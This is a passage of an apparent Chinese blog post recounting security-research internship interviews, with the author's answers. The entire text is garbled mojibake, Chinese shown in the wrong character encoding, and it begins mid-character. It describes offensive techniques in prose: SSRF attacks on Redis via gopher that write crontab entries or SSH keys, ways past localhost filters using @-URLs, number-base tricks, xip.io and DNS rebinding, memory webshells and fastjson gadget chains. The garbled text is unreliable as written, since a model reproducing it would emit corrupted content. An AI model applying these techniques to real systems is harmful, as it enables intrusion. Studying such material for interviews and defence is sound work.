¹æ®å¯ç”¨å­—ç¬¦æ¥æ‰“ï¼Œé‚£è¾¹ä¼¼ä¹å¾ˆä¸æ»¡æ„</p><p>12ã€æœ‰é‡åˆ°è¿‡è¯­æ„å‹çš„ waf å—ï¼Ÿè‡ªå·±æ˜¯æ€ä¹ˆ bypass çš„å‘¢ï¼Ÿ</p><p>æˆ‘è¿™é‡ŒçœŸçš„æœ‰ç‚¹éº»ï¼Œæ»¡è„‘å­éƒ½æ˜¯ HIDS å’Œé˜¿é‡Œçš„äº§å“ï¼ŒåŒ…æ‹¬å…ˆçŸ¥ ban waf</p><p>13ã€å¦‚æœç»™åˆ°ä½ ä¸€ä¸ª1dayï¼Œä½ è¦æ€ä¹ˆæ ·è¿›è¡Œæ¼æ´åˆ†æå‘¢ï¼Ÿ</p><p>14ã€åˆé—®äº†æˆ‘å¦‚æœå°±æ˜¯ä¸€ä¸ª SQL æ³¨å…¥çš„ 1dayï¼Œè®©ä½ æ¼æ´åˆ†æï¼Œä½ ä¼šæ€ä¹ˆåˆ†æå‘¢ï¼Œæ¯”å¦‚æ˜¯æœ‰äº›ç‰¹å®šæ¡ä»¶ä¸‹çš„ SQL æ³¨å…¥ï¼Œæ¯”å¦‚ä»€ä¹ˆä»€ä¹ˆé…ç½®æ–‡ä»¶ä¸‹ï¼Œä½ ä¼šæ€ä¹ˆåˆ†æå‘¢ï¼Ÿ</p><p>15ã€é‚£ä½ è¿™æ ·åˆ†ææµç¨‹ä¸ä¼šå¾ˆè€—æ—¶é—´å—ï¼Ÿå¦‚æœddlä¹‹å‰ä½ è¿˜æ²¡æœ‰åˆ†æå®Œæ¼æ´å‘¢ï¼Ÿä½ ä¼šæ€ä¹ˆåŠï¼Ÿ</p><p>16ã€é‚£å¦‚æœè¿˜æ˜¯åˆ†æä¸å‡ºæ¥ï¼Œä½ æ˜¯ä¸æ˜¯è¦æ€è€ƒä¸€ä¸‹ä½ çš„æ–¹æ³•æ˜¯ä¸æ˜¯æœ‰é—®é¢˜äº†</p><p>æˆ‘: å—¯â€¦â€¦åº”è¯¥æ˜¯å§</p><p>17ã€é‚£å¦‚æœä½ çš„ 1day ç§¯ç´¯çš„å¾ˆå¤šéƒ½å®Œä¸æˆå‘¢</p><p>æˆ‘è¯´æˆ‘å¯èƒ½ä¼šè€ƒè™‘é—®ä¸€ä¸‹å…¶ä»–æœ‰è¿‡ç»éªŒçš„å¸ˆå‚…ï¼Œå¤šå¤šå–ç»ã€‚</p><p>æˆ‘å¤§è‡´äº†è§£ä½ çš„æƒ…å†µäº†ï¼Œèƒ½è¯´è¯´ SSRF æ€ä¹ˆæ ·æ‰èƒ½æœ€å¥½çš„åˆ©ç”¨å‘¢ï¼Ÿ</p><p>æˆ‘è¯´ï¼ŒSSRF ç”¨çš„å¥½çš„è¯æ˜¯å¯ä»¥ rce çš„ï¼Œä½†æ˜¯å‰ææ˜¯ä½ éœ€è¦å…ˆæ¢æ´»ã€‚å½“ç„¶è¿™é‡Œ rce çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚é…åˆæ–‡ä»¶ä¸Šä¼  gopher æ‰“ã€‚</p><p>18ã€é‚£å¦‚æœç›®å‰æˆ‘ä»¬æ¢æ´»å‡ºæ¥æœ‰ä¸ª redis æœåŠ¡ï¼Œä½ è¦æ€ä¹ˆæ‰“å‘¢</p><p>SSRF æ‰“ redis çš„æœ¬è´¨å°±æ˜¯ä»¿ redis å‘½ä»¤ï¼Œå°†å…¶å†™å…¥ä¸€äº› shellã€‚æˆ‘ç­”äº†æœ€å¤šçš„ä¸€èˆ¬éƒ½æ˜¯ crontabï¼Œè¿˜æœ‰å†™å…¥ shellï¼Œå°±ç±»ä¼¼äºæ–‡ä»¶åŒ…å«çš„åŸç†ã€‚å…¶å®è¿˜æœ‰å†™å…¥ ssh ç§é’¥ã€‚è¿˜æœ‰ä¸»ä»å¤åˆ¶ä»€ä¹ˆçš„ã€‚</p><p>19ã€èƒ½è¯´ä¸€è¯´ ssrf çš„é˜²å¾¡å˜›</p><p>æˆ‘è¯´äº†åŠ ç™½ï¼Œæœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œåç»­åˆè¡¥å……äº†è¯´é™åˆ¶ä¸€äº›ä¸å¿…è¦çš„åè®®ï¼Œåƒ gopher è¿™ç§å®Œå…¨æ²¡å¿…è¦å•Šï¼Œè¿˜æœ‰å°±æ˜¯ä¸ç»™å›æ˜¾ï¼Œè¿™æ ·çš„è¯å¯¹æ–¹æ¢æ´»ä¹Ÿæ¢ä¸å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œå¯èƒ½å°±ä»¥ä¸ºè¿™é‡Œå¹¶ä¸å­˜åœ¨ ssrfï¼Œä½†è¿˜å¾—æ˜¯ç™½åå•ç‰›é€¼</p><p>20ã€é‚£å¦‚æœåœ¨å˜é‡é‡Œé¢å‘¢ï¼Ÿä½ è¦æ€ä¹ˆè¿‡æ»¤</p><p>æˆ‘æ„Ÿè§‰è¿™é‡Œå°±æ˜¯åŠ ä¸ª filterï¼Œå®ç°å•ä¸€èŒè´£åŸåˆ™</p><p>21ã€é‚£å¦‚æœæˆ‘è¿™é‡Œé™åˆ¶äº† 127.0.0.1ï¼Œé™åˆ¶äº† 127.0.0.2 ï¼Œé‚£ä½ è¦æ€ä¹ˆ bypass å‘¢</p><p>æˆ‘ç›´æ¥è¯´äº† dns rebindingï¼Œæˆ‘è¯´è¿™ç§æ”»å‡»éå¸¸å¯è§‚ã€‚é¢è¯•å®˜é—®æˆ‘è¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„å‘¢ï¼Ÿæˆ‘è¡¥å……äº† @ ç¬¦ç»•è¿‡ï¼Œè¿›åˆ¶è½¬æ¢ï¼Œå¥å·æ›¿æ¢.ç¬¦å·ã€‚</p><p>22ã€èƒ½å±•å¼€è®²è®² @ ç¬¦æ˜¯è¿™ä¹ˆç»•è¿‡çš„å—</p><p>è¿™é‡Œå…¶å®æ˜¯å’Œ url åè®®æ˜¯æœ‰å…³ç³»çš„ï¼Œå› ä¸ºæˆ‘ä»¬æœ¬è´¨çš„ url åè®®æ˜¯è¿™æ ·è¯·æ±‚èµ„æºçš„<br>httpâˆ¶&#x2F;&#x2F;url@ipï¼Œç„¶ååé¢è·Ÿä¸Šè¯·æ±‚çš„èµ„æºï¼Œæ¯”å¦‚ <a class="link" href="http://www.baidu.com@1.1.1.1,é‚£ä¹ˆæˆ‘ä»¬è¿™é‡ŒæŠŠåé¢/">http://www.baidu.com@1.1.1.1ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡ŒæŠŠåé¢<i class="fas fa-external-link-alt"></i></a> @ çš„å†…å®¹ä¿®æ”¹æˆæ¶æ„çš„ 127.0.0.1å³å¯ã€‚</p><p>23ã€é¢è¯•å®˜åˆé—®ï¼Œå¦‚æœæŠŠè¿™äº›å„ç§ç¬¦å·éƒ½ç¦äº†å‘¢ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¿‡æ»¤è¿™äº›è¾“å…¥ã€‚</p><p>æˆ‘è¯´é‚£å°± dns rebinding å‘—ï¼Œé¢è¯•å®˜è¯´ dns rebinding çš„äº‹å„¿åˆ°æ—¶å€™å†è¯´ã€‚ç„¶åç­”äº†è¿›åˆ¶è½¬æ¢ï¼Œä»–è¯´ç®—ä¸€ç§ï¼Œåˆç­”äº† xip.io ä¸ xip.name<br>æ³›åŸŸåè§£æï¼Œæ— éœ€é…ç½®ï¼Œå°†è‡ªå®šä¹‰çš„ä»»ä½•åŸŸåè§£æåˆ°æŒ‡å®šçš„ IP åœ°å€ã€‚å‡è®¾ä½ çš„ IP åœ°å€æ˜¯ 10.0.0.1ï¼Œä½ åªéœ€ä½¿ç”¨ å‰ç¼€åŸŸå+IPåœ°å€+xip.io å³å¯å®Œæˆç›¸åº”è‡ªå®šä¹‰åŸŸåè§£æã€‚</p><p>24ã€å…³äºå†…å­˜é©¬æœ‰äº†è§£å˜›ï¼Ÿå¯ä»¥ç®€å•è®²è®²æœ‰å“ªäº›å†…å­˜é©¬å—ï¼Ÿ</p><p>æˆ‘è¯´äº†æˆ‘åªæäº† Tomcat å‹å†…å­˜é©¬ï¼Œæˆ‘çŸ¥é“è¿˜æœ‰ Agent å‹å†…å­˜é©¬å’Œ websocket å‹ï¼Œè¿˜æœ‰ upgrade å‹å†…å­˜é©¬ã€‚</p><p>25ã€å†…å­˜é©¬çš„æŸ¥æ€äº†è§£è¿‡åŸç†å—ï¼Ÿ</p><p>æˆ‘éº»äº†ï¼Œæˆ‘è¯´çœ‹è°ƒç”¨çš„æ‰€æœ‰çš„filtersï¼Œçœ‹å“ªäº› filters æ˜¯æ¶æ„çš„ï¼Œæ˜¯ç¨‹åºæ²¡æœ‰çš„</p><p>26ã€åé¢é—®äº†é—®å®ä¹ è–ªèµ„æœŸæœ›</p><blockquote><p>æ¥ä¸‹æ¥å°±æ˜¯åé—®ç¯èŠ‚</p></blockquote><h2 id="ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é¢è¯•"><a href="#ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é¢è¯•" class="headerlink" title="ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é¢è¯•"></a>ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é¢è¯•</h2><h3 id="ä¸€é¢"><a href="#ä¸€é¢" class="headerlink" title="ä¸€é¢"></a>ä¸€é¢</h3><p>1ã€è‡ªæˆ‘ä»‹ç»</p><p>2ã€è®²ä¸€è®²æœ€è¿‘åœ¨åšä»€ä¹ˆå§</p><p>3ã€è¯´ä¸€è¯´ Shiro è¿™ä¸ªæ´éƒ½äº†è§£å¤šå°‘</p><p>4ã€è‡ªå·±æœ‰æ²¡æœ‰ç‹¬ç«‹æŒ–å‡ºè¿‡ 0day</p><p>5ã€weblogic äº†è§£å¤šå°‘</p><p>è¯´äº†ä¸€ä¸‹å¤ç°äº†çš„æ¼æ´ï¼Œç„¶åé¢è¯•å®˜è®©æˆ‘è¯´ä¸€è¯´å…·ä½“çš„ä¸€ä¸ªæ¼æ´</p><p>6ã€weblogic çš„ T3 å’Œ XMLDecoder æ¼æ´å±•å¼€è®²è®²å§</p><p>7ã€fastjson å¤ç°è¿‡å¤šå°‘æ¼æ´ï¼Œä½ ç ”ç©¶çš„ç‰ˆæœ¬æ˜¯å¤šå°‘</p><p>8ã€èƒ½ç®€å•è¯´ä¸€è¯´ Java ååºåˆ—åŒ–çš„æµç¨‹å—ï¼Ÿ</p><p>9ã€è®²è®² RMI çš„é€šä¿¡åŸç†ä»¥åŠä¸ºä»€ä¹ˆä¼šå­˜åœ¨æ¼æ´</p><p>10ã€çœ‹åˆ°ä½ è¿˜æœ‰åœ¨çœ‹ PHP çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æ˜¯ç ”ç©¶å“ªç§ä¸ºä¸»å‘¢ï¼ŒPHP è¿˜æ˜¯ Java</p><p>11ã€è¯´ä¸€è¯´ä½ åšè¿‡çš„ä¸€äº›é¡¹ç›®å§</p><p>12ã€å†™è¿™ä¸ª Java è·¯çº¿ï¼Œä½ æ˜¯å‡ºäºä»€ä¹ˆè€ƒè™‘å‘¢ï¼Ÿ</p><p>13ã€çœ‹åˆ°ä½ å®¡è®¡è¿‡ä¸€äº› CMSï¼Œè‡ªå·±ä»ä¸­æœ‰ä»€ä¹ˆæ”¶è·å—ï¼Ÿ</p><h3 id="äºŒé¢"><a href="#äºŒé¢" class="headerlink" title="äºŒé¢"></a>äºŒé¢</h3><p>äºŒé¢ä¸»è¦æ˜¯èŠäº†èŠä¸€äº›æŒ–æ´çš„æ€æƒ³&#x2F;ä¸ªäººç»å†ï¼Œå¾ˆæœ‰èŠå¤©çš„æ„Ÿè§‰ï¼Œä¸ªäººå¿˜è®°è®°å½•å®Œå…¨äº†ã€‚</p><h3 id="HR-é¢"><a href="#HR-é¢" class="headerlink" title="HR é¢"></a>HR é¢</h3><p>1ã€çœ‹åˆ°ä½ çš„ç®€å†ä¸Šå†™äº†æœ‰è¯´ç½‘ç»œå®‰å…¨åä¼šï¼Œéƒ½åšäº†åä¼šå“ªäº›å·¥ä½œå‘¢</p><p>2ã€é¢„æœŸè–ªèµ„æ˜¯å¤šå°‘å‘¢ï¼Œæˆ‘è¯´åœ¨åŒ—äº¬å·®ä¸å¤š 330&#x2F;å¤©å§</p><p>åé¢åˆè¯´ç»™å®ä¹ ç”Ÿè–ªèµ„ä¸€ä¸ªæœˆæ˜¯ 5500</p><p>3ã€æœ‰æ²¡æœ‰ä¸€æ®µå¾ˆéš¾çš„æ—¶å…‰</p><p>4ã€ä½ æ˜¯ç‹¬ç”Ÿå­å¥³å—</p><p>5ã€æœ€è®©ä½ è‡ªè±ªçš„ä¸€ä»¶äº‹æ˜¯ä»€ä¹ˆ</p><p>6ã€åœ¨ CTF ä¸Šè®©ä½ æœ‰å¾ˆè‡ªè±ªçš„äº‹æƒ…å—</p><p>7ã€æœ‰æ”¶åˆ°å…¶ä»–å®¶çš„ offer å—</p><p>8ã€ç›®å‰å¤šä¹…èƒ½è¿‡æ¥å‘¢</p><h2 id="ææ°ªå®‰å…¨ç ”ç©¶"><a href="#ææ°ªå®‰å…¨ç ”ç©¶" class="headerlink" title="ææ°ªå®‰å…¨ç ”ç©¶"></a>ææ°ªå®‰å…¨ç ”ç©¶</h2><p>1ã€ç®€å•è¯´ä¸€è¯´ä½ ä½œä¸ºçº¢é˜Ÿï¼Œåœ¨ hvv æœŸé—´ä¼šæœ‰æ€æ ·çš„è§†è§’</p><p>æˆ‘è¯´ï¼Œè¿™æ˜¯ä¸æ˜¯å°±æ˜¯ hvv è§†è§’ä¸‹çš„çº¢é˜Ÿæ”»å‡»ã€‚é¢è¯•å®˜è¯´æ˜¯çš„</p><p>ç„¶åå°±è¯´äº†ç¤¾å·¥é’“é±¼ã€ä¿¡æ¯æ”¶é›†ã€å¤–ç½‘æ‰“ç‚¹ã€å†…ç½‘æ¨ªç§»ã€è¿˜æœ‰å°±æ˜¯é€šè¿‡ä¿¡æ¯æ³„éœ²æ‹¿æºç ï¼Œå†è¿›è¡Œæºç å®¡è®¡ï¼Œå†å°±æ˜¯ 0dayã€1day çš„åº”ç”¨ã€æ¶æ„æµé‡åˆ†æ</p><p>2ã€å¬åˆ°ä½ è¯´äº†æºç å®¡è®¡ï¼Œç®€å•è¯´ä¸€ä¸‹æ€è·¯å§</p><p>å°±è¿˜æ˜¯é‚£ä¸€å¥— filter â€”â€”&gt; pom.xml â€”â€”&gt; ç»†çš„åŠŸèƒ½ç‚¹ â€”â€”&gt; è°ƒè¯•</p><p>3ã€è¯´ä¸€è¯´å¦‚æœ hvv æœŸé—´å‡ºäº†ä¸€ä¸ª fastjson çš„ dayï¼Œä½ éœ€è¦æ€ä¹ˆé˜²æŠ¤</p><p>ç»™æˆ‘ç‰¹ä¹ˆé—®ä½äº†ï¼Œé¢è¯•å®˜å…¶å®åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¸€ç›´åœ¨å‘æˆ‘å¾€å·¥å…·åˆ©ç”¨é‚£æ–¹é¢å¼•å¯¼ã€‚æˆ‘è¯´äº†åŠ é»‘ï¼Œç„¶ååŠ ç™½è¿™æ ·çš„ç­–ç•¥ã€‚</p><p>ä»–åˆå’Œæˆ‘è¯´ï¼Œæ€ä¹ˆæ ·åˆ¤æ–­èµ„äº§é‡Œé¢æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´å‘¢ã€‚æˆ‘è¯´ç”¨å·¥å…·æµ‹ï¼Œè¯´å¦‚æœä½ ä»¬æœ‰æ¯”è¾ƒæˆç†Ÿçš„ç™½ç›’æ‰«æå·¥å…·æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯æˆ‘æ²¡ç”¨è¿‡ã€‚åæ­£è¿™ä¸ªé—®é¢˜çº ç»“äº†å¾ˆä¹…ã€‚ã€‚ã€‚ã€‚</p><p>4ã€è¯´ä¸€è¯´å†…ç½‘æ¨ªç§»çš„æ€è·¯å§</p><p>æˆ‘è¯´åˆ† Windows å’Œ Linuxï¼ŒLinux æ¯”è¾ƒéš¾æ¨ªç§»ï¼›Windows å°±è¿˜æ˜¯é‚£ä¸€å¥—</p><p>5ã€è¯´ä¸€è¯´é™¤äº† web æœåŠ¡ä¹‹å¤–è¿˜æœ‰æœåŠ¡å€¼å¾—æ³¨æ„</p><p>è¿™ä¸ªé—®é¢˜é—®çš„æŒºã€‚ã€‚ã€‚éšæ™¦</p><p>å…¶å®å°±æ˜¯é—®æœ‰å“ªäº›ç«¯å£ï¼Œæˆ‘å°±è¯´äº†é‚£äº›</p><p>6ã€è¯´ä¸€è¯´ä½ ç”¨ python åšè¿‡çš„ä¸€äº›é¡¹ç›®å§</p><p>ç®€å•èŠäº†èŠ</p><p>7ã€æœ‰åšè¿‡ç™½ç›’ä»£ç å®¡è®¡çš„ä¸€äº›é¡¹ç›®å—</p><p>æ²¡æœ‰</p><p>8ã€å¦‚æœä½ æŒ–æ˜ Java ååºåˆ—åŒ–çš„ 0dayï¼Œä½ ä¼šæ€ä¹ˆæŒ–æ˜å‘¢</p><p>å°±è¿˜æ˜¯é‚£æ ·</p><blockquote><p>ä¸‹é¢æ˜¯åé—®ç¯èŠ‚</p></blockquote><p>ä¸»è¦é—®äº†é—®ä»–ä»¬çš„ä¸šåŠ¡ã€è½¬æ­£ã€ä¸€èˆ¬ä¸Šç­å¼ºåº¦å¦‚ä½•ã€éƒ¨é—¨åœ°ä½å¦‚ä½•ã€é£Ÿå ‚</p><p>å°±è¿™äº›</p><h2 id="å¢¨äº‘ç§‘æŠ€å®‰å…¨ç ”ç©¶"><a href="#å¢¨äº‘ç§‘æŠ€å®‰å…¨ç ”ç©¶" class="headerlink" title="å¢¨äº‘ç§‘æŠ€å®‰å…¨ç ”ç©¶"></a>å¢¨äº‘ç§‘æŠ€å®‰å…¨ç ”ç©¶</h2><p>æ€»ä½“ä¸Šæ¥è¯´å’Œç™½å¸½æ±‡çš„é¢è¯•å¾ˆåƒï¼Œå½“æ—¶ä¾¿æ²¡æœ‰è®°å½•ï¼Œè€Œä¸”é—®çš„å¾ˆæ€¥</p><h2 id="å¥‡å®‰ä¿¡è§‚æ˜Ÿå®éªŒå®¤"><a href="#å¥‡å®‰ä¿¡è§‚æ˜Ÿå®éªŒå®¤" class="headerlink" title="å¥‡å®‰ä¿¡è§‚æ˜Ÿå®éªŒå®¤"></a>å¥‡å®‰ä¿¡è§‚æ˜Ÿå®éªŒå®¤</h2><h3 id="ä¸€é¢-1"><a href="#ä¸€é¢-1" class="headerlink" title="ä¸€é¢"></a>ä¸€é¢</h3><p>1ã€å…ˆåšä¸ªè‡ªæˆ‘ä»‹ç»å§</p><p>2ã€æˆ‘çœ‹ä½ æœ‰å¤ç°è¿‡ä¸€äº› Java ååºåˆ—åŒ–çš„æ¼æ´ï¼Œç®€å•è®²ä¸€è®²æ¼æ´åŸç†å§ã€‚</p><p>easy</p><p>3ã€åœ¨è¿™äº›ååºåˆ—åŒ–çš„é“¾å­é‡Œé¢ï¼Œæœ‰ä»€ä¹ˆæ¯”è¾ƒå…±é€šçš„åœ°æ–¹å—</p><p>æˆ‘è¯´äº†é“¾é¦–ã€é“¾å°¾ã€sink è¦æ±‚</p><p>4ã€ä½ æœ‰å®¡è®¡ Java ä»£ç çš„ç»éªŒï¼Œå¯ä»¥ç®€å•è¯´ä¸€è¯´å—ï¼Ÿ</p><p>è¯´äº†ä¸€äº›æ€è·¯</p><p>5ã€æˆ‘çœ‹ä½  CTF æ‰“çš„å¾ˆå¤šï¼Œå…¶ä¸­åº”è¯¥æœ‰å¾ˆå¤š PHP å§ï¼Œç„¶åä½ æŒ–çš„ PHP æ´ä¹ŸæŒ–äº†å‡ ä¸ªï¼Œç®€å•è®²è®²è®©ä½ å°è±¡æ·±åˆ»çš„æ´å§ã€‚</p><p>è¯´äº†ä¸€ä¸ª SQL æ³¨å…¥ï¼Œä¸€ä¸ª phar</p><p>6ã€æˆ‘çœ‹ä½ å¤ç°è¿‡ fastjson ç³»åˆ—çš„æ´ï¼Œè¯´ä¸€è¯´æœ€æ–°çš„é‚£ä¸ª fastjson 1.2.80 çš„æ´å§ï¼Œå°±æµ…è“æŒ–çš„é‚£ä¸ª</p><p>æ—¥äº†ã€‚ã€‚ã€‚æˆ‘æ²¡å¾ˆå¥½çš„å¤ç°è¿‡</p><p>7ã€é‚£ä½ è¯´ä¸€è¯´ fastjson çš„ä¸€äº›æ¼æ´åŸç†å’Œç»•è¿‡æ€è·¯å§</p><p>æˆ‘è¯´äº†ä¸€äº›ï¼Œä½†æ˜¯æœ‰ä¸€æ¡é€šæ€çš„ jdbc æ²¡æœ‰å¾ˆå¥½çš„åˆ†æè¿‡ï¼Œåæ‚”ã€‚</p><p>8ã€PHP ååºåˆ—åŒ–çš„æ¼æ´æŒ–æ˜æ€è·¯å¯ä»¥è¯´ä¸€ä¸‹å—ï¼Ÿ</p><p>è¿™ä¸ªä¸ä¼š</p><p>9ã€jpress æˆ‘çœ‹ä½ æœ‰å®¡è®¡çš„æ ¡éªŒï¼Œæœ‰è‡ªå·±æå‡ºæ¥ä¸€äº›å‰å° RCE å—</p><p>æ— </p><p>10ã€ç®€å•èŠä¸€èŠ Java å†…å­˜é©¬å§ï¼ŒåŸç†ä»¥åŠå¦‚ä½•å†™å…¥</p><p>åé¢å°±æ˜¯åé—®ç¯èŠ‚ï¼Œé—®äº†ä¸€ä¸‹ä»–ä»¬çš„ä¸šåŠ¡ï¼Œç„¶åå¤§æ¦‚ç»„ç»‡æ¶æ„ï¼Œè½¬æ­£æƒ…å†µ</p><h3 id="äºŒé¢-1"><a href="#äºŒé¢-1" class="headerlink" title="äºŒé¢"></a>äºŒé¢</h3><p>è¯´å®è¯äºŒé¢æ²¡æœ‰å‡†å¤‡å¥½ï¼Œå› ä¸ºä¸€äº›ç‰¹æ®ŠåŸå› </p><p>1ã€åšä¸ªè‡ªæˆ‘ä»‹ç»å§ï¼Œä¸»è¦è®²ä¸€è®²è‡ªå·±ç ”ç©¶å“ªä¸ªæ–¹å‘ã€‚</p><p>2ã€PHP å®¡è®¡è¿‡å“ªäº›å¤§å‹çš„ CMS å‘¢</p><p>æˆ‘è¯´äº† TPï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„è‡ªå·±å®¡è®¡çš„</p><p>3ã€TP é‡Œé¢ä¸æ˜¯æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œå—ï¼Ÿå¯ä»¥è¯´ä¸€è¯´é‡Œé¢å¤§æ¦‚ååˆ©ç”¨æ˜¯æ€ä¹ˆåˆ©ç”¨çš„ï¼Œæ¯”å¦‚ç°åœ¨ç›®æ ‡ç«™å¼€å¯äº† <code>disabled_function</code></p><p>æˆ‘è¿™é‡Œæœ‰ç‚¹éº»ï¼Œæœ¬èº« PHP å°±ä¸æ˜¯å¾ˆå¥½ï¼Œæˆ‘è¯´å¦‚æœåˆ©ç”¨è§’åº¦æ¥è¯´ï¼Œèšå‰‘çš„æ’ä»¶å°±è¡Œï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ¡ä»¶çš„è¯å°±æ‰‹åŠ¨å†™å…¥ <code>.so</code> æ–‡ä»¶</p><p>é‚£ä½ è¯¦ç»†è¯´ä¸€è¯´æ€ä¹ˆå†™è¿›å»â€¦â€¦ å¯„ã€æˆ‘å¿˜äº†å…·ä½“åˆ©ç”¨æ‰‹æ³•</p><p>4ã€PHP é‡Œé¢çš„ extract å˜é‡è¦†ç›–è¿™ä¸ªé—®é¢˜ï¼Œæœ‰åœ¨å®é™…æ¼æ´æŒ–æ˜çš„æ—¶å€™é‡åˆ°è¿‡å—</p><p>æ²¡æœ‰</p><p>5ã€é¢è¯•å®˜ä¼¼ä¹è¿˜æ˜¯å¾ˆæƒ³é—® PHP çš„ï¼Œé—®äº† PHP çš„å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œè¿˜æ˜¯æ²¡æ€ä¹ˆç­”å‡ºæ¥ã€‚</p><p>åˆé—®äº†é—® æœ€è¿‘æ‰“çš„ CTFï¼Œä¸»è¦æ˜¯ ant å’Œ é˜¿é‡Œäº‘ï¼Œè®©æˆ‘è®²è®²å°è±¡æ·±åˆ»çš„é¢˜ç›®ï¼Œæˆ‘éƒ½å¿˜å¾—å·®ä¸å¤šäº†ã€‚ã€‚</p><p>6ã€è¯´ä¸€è¯´ Java JDBC MySQL ååºåˆ—åŒ–è¿™ä¸ªæ¼æ´å§</p><p>æˆ‘è¯´è¿™åªæ˜¯ç»™äº†ä¸€ä¸ªå…¥å£ï¼Œéœ€è¦ä¼ªé€  MySQL fake server</p><p>7ã€é‚£ä½ è¯´ä¸€è¯´æ€ä¹ˆåˆ¤æ–­ MySQL jdbc çš„ç‰ˆæœ¬å§</p><p>æˆ‘è¯´ wireshark æŠ“ä¸ªåŒ…ï¼Œå†…å®¹åº”è¯¥ä¼šåœ¨é‡Œé¢</p><p>8ã€çœ‹ä½  Java CMS å®¡è®¡è¿‡ jpressï¼Œå½“æ—¶æ˜¯å¤ç°è¿˜æ˜¯</p><p>æˆ‘è¯´äº†å¤ç°ï¼Œç„¶åè®©æˆ‘èŠä¸€èŠå°è±¡æœ€æ·±åˆ»çš„ä¸€ä¸ªæ´</p><p>9ã€å¦‚æœç°åœ¨æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯åªæœ‰ <code>Web-INF</code> ä¸‹çš„ <code>.jsp</code> æ–‡ä»¶æ‰ä¼šè¢«æ¸²æŸ“ï¼Œä½ æœ‰ä»€ä¹ˆæ€è·¯</p><p>æˆ‘è¯´äº† SSTIã€crontabã€shã€weblogic çš„éƒ¨ç½²éƒ½å¯ä»¥</p><p>10ã€ä½ æœ‰åœ¨å¤§å‹æ”»é˜²æ¼”ç»ƒå½“ä¸­è·Ÿè¿›è¿‡ä¸€äº› VMware ç±»å‹çš„æ¼æ´å—ï¼Ÿå±•å¼€èŠèŠ</p><p>æˆ‘è¯´æˆ‘åªåšè¿‡è“é˜Ÿï¼Œç„¶å VMware çš„è¯ï¼Œæœ€æ–°çš„æ´æ­£åœ¨çœ‹ã€‚ç„¶åç®€å•è®²ä¸€è®²ï¼Œæ„Ÿè§‰é¢è¯•å®˜æ²¡æœ‰å¤ç°è¿™ä¸ªæ¼æ´</p><p>11ã€å¬ä½ è¯´åˆ†æäº† RocketMQ çš„æ´ï¼Œç®€å•èŠèŠå§</p><p>å°±ç®€å•èŠäº†èŠ</p><p>12ã€é‚£å¦‚æœä¸å‡ºç½‘å‘¢ï¼Ÿ</p><p>ã€‚ã€‚ã€‚ã€‚æˆ‘è¯´è¿™ä¸ªå•çº¯ä»è¿™ä¸ªæ¼æ´çš„è§’åº¦æ¥è¯´ï¼Œå…¶å®æ˜¯å¯ä»¥å†™å…¥ crontab çš„ï¼Œä½†æ˜¯å®é™…æ‰“å†…å­˜é©¬ï¼Œæˆ‘è¿˜æ²¡æœ‰è¯•è¿‡ã€‚</p><p>ä¸‹é¢å°±æ˜¯åé—®ç¯èŠ‚</p><h2 id="æ²¥æ³‰ç§‘æŠ€çº¢é˜Ÿå®‰å…¨ç ”ç©¶"><a href="#æ²¥æ³‰ç§‘æŠ€çº¢é˜Ÿå®‰å…¨ç ”ç©¶" class="headerlink" title="æ²¥æ³‰ç§‘æŠ€çº¢é˜Ÿå®‰å…¨ç ”ç©¶"></a>æ²¥æ³‰ç§‘æŠ€çº¢é˜Ÿå®‰å…¨ç ”ç©¶</h2><p>1ã€åšä¸ªè‡ªæˆ‘ä»‹ç»å§</p><p>2ã€çœ‹ä½ æ¼æ´è¿™å—ï¼ŒJavaï¼ŒPHPï¼ŒPython éƒ½æœ‰äº†è§£æ˜¯å—ï¼Ÿç®€å•è¯´ä¸€è¯´æ€ä¹ˆå®¡è®¡ PHP æ¼æ´çš„å§ã€‚</p><p>è¯´äº†ç”¨ Seay æ‰«ä¸€æ‰«ï¼Œç„¶åå¯¹æ‰«å‡ºæ¥çš„é‡ç‚¹å»å®¡è®¡ï¼Œé»‘ç™½ç›’ç»“åˆä¸€èµ·æ‰“</p><p>3ã€Seay æ˜¯å¾ˆè€çš„ä¸œè¥¿äº†ï¼Œä½ æœ‰æ²¡æœ‰ä¿®æ”¹ä¸€ä¸‹å®ƒçš„è§„åˆ™ä»€ä¹ˆçš„</p><p>ç­”ï¼šæ²¡æœ‰ã€‚ã€‚ã€‚å¯„</p><p>4ã€å¦‚æœä½ æ²¡æœ‰ä¿®æ”¹è¿‡çš„è¯ï¼Œé‚£ä½ æ€ä¹ˆæ ·æ‰èƒ½æŒ–å‡ºåˆ«äººæŒ–ä¸å‡ºæ¥çš„æ´å‘¢ï¼Ÿ</p><p>ä¸ä¼šå•Šã€‚ã€‚éº»äº†</p><p>5ã€è¯´ä¸€è¯´äº†è§£çš„ Java æ¼æ´å§ï¼Œåƒ fastjsonã€shiro è¿™äº›ï¼Œå°±å…ˆè¯´è¯´ fastjson å§ï¼Œä½ å¯¹å®ƒäº†è§£å¤šå°‘ã€‚</p><p>è¿™é‡Œæˆ‘è¯´äº†è¯´ fastjson æœ€å¥½ç”¨çš„ä¸¤æ¡é“¾å­ï¼Œä¸€æ¡æ˜¯ templatesImpl çš„ï¼Œå¦å¤–ä¸€æ¡æ˜¯ä¸å‡ºç½‘çš„ BCELã€‚</p><p>6ã€ç®€å•è¯´ä¸€è¯´ fastjson çš„ checkAutoType 